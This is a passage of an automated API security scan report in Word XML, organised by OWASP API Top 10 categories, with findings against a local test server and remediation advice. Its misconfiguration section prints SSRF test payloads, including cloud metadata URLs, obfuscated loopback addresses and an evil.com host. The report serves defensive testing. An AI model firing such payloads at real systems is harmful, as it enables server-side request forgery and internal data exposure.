        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.096483</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>15. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.100143</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>⚠️ **Medium Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.656635</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>2. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.658746</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>3. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.660710</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>4. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.662425</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>5. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.666724</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>6. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.668789</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>7. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.670920</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>8. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.672512</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>9. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.676803</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>10. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.678931</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>11. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.680497</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>12. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.682623</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>13. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.696520</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>14. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.698886</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>15. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.700997</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>16. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.702957</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>17. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.707239</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>18. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.708834</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>19. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.711105</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>20. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.713218</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>21. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.717012</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>22. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.719142</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>23. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.721233</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>24. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.722819</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>25. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.736301</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>26. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.737896</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>27. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.740046</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>28. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.741662</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>29. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.745882</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>30. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.747990</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>31. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.750170</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>32. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.751778</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>33. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.765257</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - POST as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>34. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.766853</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PUT as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>35. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.768961</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - DELETE as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>36. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.770541</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Excessive restriction - PATCH as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>37. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.772678</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>38. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.774287</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>39. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.776385</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>40. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.778514</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>41. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.780694</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>42. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.783383</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>43. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.784983</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>44. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.787112</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>45. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.789242</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>46. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.791314</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>47. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.792978</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>48. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.795514</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Endpoint accepts requests without Authorization header</w:t>
        <w:br/>
        <w:br/>
        <w:t>49. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.815864</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>50. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.835116</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>51. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.854410</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>52. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.874246</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>53. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.894735</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>54. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.916518</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>55. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.937808</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>56. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.959050</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>57. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.983537</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>58. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.007694</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>59. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.032003</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>60. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.051801</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Rate-limiting may be bypassed</w:t>
        <w:br/>
        <w:br/>
        <w:t>ℹ️ **Low Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.602477</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No token obtained for role user verkregen</w:t>
        <w:br/>
        <w:br/>
        <w:t>2. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.621098</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No token obtained for role editor verkregen</w:t>
        <w:br/>
        <w:br/>
        <w:t>3. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.651865</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No token obtained for role admin verkregen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Use RBAC or ABAC with deny-by-default</w:t>
        <w:br/>
        <w:t>- Centralize authorization logic</w:t>
        <w:br/>
        <w:t>- Thoroughly test ALL admin functions</w:t>
        <w:br/>
        <w:t>- Require step-up authentication for critical actions</w:t>
        <w:br/>
        <w:t>- Document and encrypt sensitive admin flows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API6:2023 – Unrestricted Access to Sensitive Business Flows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Attackers can automate or abuse sensitive business processes (e.g. checkout, booking) when there are no anti-fraud measures.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BusinessFlows</w:t>
        <w:br/>
        <w:t>Scan Time: 2025-06-01 11:49:43</w:t>
        <w:br/>
        <w:t>Base URL: http://127.0.0.1:8888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0 | Multiple sensitive items exposed |</w:t>
        <w:br/>
        <w:t>| 🛑 High       | 11 | Single sensitive item exposed |</w:t>
        <w:br/>
        <w:t>| ⚠️ Medium     | 0 | 200 OK on unprotected endpoint |</w:t>
        <w:br/>
        <w:t>| ℹ️ Low        | 0 | Errors or minor issues |</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Detailed Findings</w:t>
        <w:br/>
        <w:br/>
        <w:t>🛑 **High Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **signup**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/auth/signup`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:28.086647</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>2. **login**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/auth/login`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:28.995827</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>3. **forgot_password**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/auth/forget-password`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:29.898809</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>4. **reset_password**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/reset-password`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:30.772718</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>5. **change_email**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/change-email`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:31.707834</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>6. **verify_email_token**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/verify-email-token`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:32.777407</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>7. **update_profile_video**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/{video_id}`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:33.746437</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>8. **post_comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/{postId}/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:34.956558</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>9. **update_order**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/{order_id}`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:35.964968</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>10. **return_order**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/return_order`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:42.333653</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>11. **mechanic_signup**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/mechanic/signup`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:43.865485</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate-limiting after 25 rapid requests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Add business context validations (e.g. balance, limits)</w:t>
        <w:br/>
        <w:t>- Use CAPTCHA/rate limiting against bots</w:t>
        <w:br/>
        <w:t>- Detect and block abnormal patterns</w:t>
        <w:br/>
        <w:t>- Require step-up authentication for risky actions</w:t>
        <w:br/>
        <w:t>- Monitor critical flows in real-time</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API7:2023 – Server Side Request Forgery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>APIs that fetch external URLs can be abused to access internal services or leak metadata.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>No findings reported for this risk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Validate &amp; sanitize all provided URLs</w:t>
        <w:br/>
        <w:t>- Use an allow-list of permitted domains</w:t>
        <w:br/>
        <w:t>- Don't follow redirects or limit the number of hops</w:t>
        <w:br/>
        <w:t>- Segment internal networks; block outgoing requests where possible</w:t>
        <w:br/>
        <w:t>- Apply egress firewall rules</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API8:2023 – Security Misconfiguration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Default or incorrect configurations (CORS, headers, debug modes) can leak sensitive information or facilitate attacks.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Enhanced Misconfiguration Auditor (API08)</w:t>
        <w:br/>
        <w:t>Scan Time: 2025-06-01 11:49:51</w:t>
        <w:br/>
        <w:t>Base URL: http://127.0.0.1:8888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0 | Multiple sensitive items exposed |</w:t>
        <w:br/>
        <w:t>| 🛑 High       | 0 | Single sensitive item exposed |</w:t>
        <w:br/>
        <w:t>| ⚠️ Medium     | 21 | 200 OK on unprotected endpoint |</w:t>
        <w:br/>
        <w:t>| ℹ️ Low        | 0 | Errors or minor issues |</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Detailed Findings</w:t>
        <w:br/>
        <w:br/>
        <w:t>⚠️ **Medium Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **POST /identity/api/auth/signup**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/signup`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.0053484439849853516s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.588927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'http://127。0。0。1/', 'target': 'http://127。0。0。1/'}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09:49:45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2. **POST /identity/api/v2/user/pictures**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/pictures`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.01705479621887207s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.706940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'http://metadata.azure.microsoft.com/', 'target': 'http://metadata.azure.microsoft.com/'}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"42",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3. **POST /identity/api/v2/user/pictures**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/pictures`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.01705479621887207s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.706940</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Unexpected server error (500)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'url': 'http://metadata.azure.microsoft.com/', 'target': 'http://metadata.azure.microsoft.com/'}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"42",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4. **POST /identity/api/v2/user/change-email**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/change-email`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.01817917823791504s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.708064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'ftp://evil.com', 'target': 'ftp://evil.com'}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5. **POST /identity/api/v2/user/reset-password**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/reset-password`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.04174375534057617s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.731629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'http://0x7f000001/', 'target': 'http://0x7f000001/'}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"26",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6. **POST /identity/api/v2/user/reset-password**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/reset-password`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
